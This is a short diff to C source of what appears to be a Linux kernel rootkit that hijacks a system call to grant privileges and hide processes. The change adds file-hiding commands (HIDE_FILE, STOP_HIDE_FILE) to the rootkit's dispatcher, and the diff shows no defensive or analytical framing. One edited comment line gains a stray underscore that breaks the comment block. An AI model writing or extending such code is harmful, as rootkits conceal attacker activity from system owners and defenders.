@@ -27,6 +27,7 @@
 
 #include "giveprivs.h"
 #include "hideproc.h"
+#include "hidefile.h"
 
 unsigned long *old_syscall = NULL;
 
@@ -35,7 +36,7 @@ unsigned long *old_syscall = NULL;
  * the possibility to call it and ask it to do something (check funcs.h to
  * know what it offers).
  *
- * @code: One of the codes defined in funcs.h that will tell yarrSyscall() what
+ _* @code: One of the codes defined in funcs.h that will tell yarrSyscall() what
  *        we want it to do.
  * @data: Depends on code, it will point to the data needed to accomplish what
  *        you want it to do.
@@ -54,6 +55,14 @@ asmlinkage long yarrSyscall(yarrOps code, const syscallData __user *data) {
 
 		case STOP_HIDE_PROCESS:
 			res = stopHideProc(data->pid);
+			break;
+
+		case HIDE_FILE:
+			res = hideFile(data->filename);
+			break;
+
+		case STOP_HIDE_FILE:
+			res = stopHideFile(data->filename);
 			break;
 
 		default:
